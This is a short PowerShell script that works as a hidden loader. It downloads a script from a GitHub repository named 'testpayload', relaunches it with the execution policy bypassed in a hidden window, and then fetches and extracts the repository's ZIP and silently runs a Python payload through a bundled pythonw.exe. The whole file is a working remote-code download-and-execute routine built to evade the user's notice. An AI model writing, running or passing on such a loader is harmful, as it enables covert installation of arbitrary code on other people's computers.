$tempDir = "$env:TEMP\b"
$flagFile = "$tempDir\script_hidden.flag"

# Create temp directory if it doesn't exist
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

$scriptUrl = "https://github.com/SirPicklez/testpayload/raw/refs/heads/main/script.ps1"
$scriptPath = "$tempDir\script.ps1"

# Download and save the script
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# If flag file doesn't exist, relaunch hidden
if (-not (Test-Path $flagFile)) {
    New-Item -ItemType File -Path $flagFile -Force | Out-Null
    Start-Process -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -WindowStyle Hidden
    exit
}

Remove-Item -Path $flagFile -Force

$zipUrl = "https://github.com/SirPicklez/testpayload/archive/refs/heads/main.zip"
$zipPath = "$env:TEMP\a.zip"

# Download ZIP
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# Extract ZIP
Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force

# Run main.py silently
$exePath = "$tempDir\testpayload-main\python\pythonw.exe"
$pythonScriptPath = "$tempDir\testpayload-main\main.py"

# Ensure the Python script runs in the background
Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $pythonScriptPath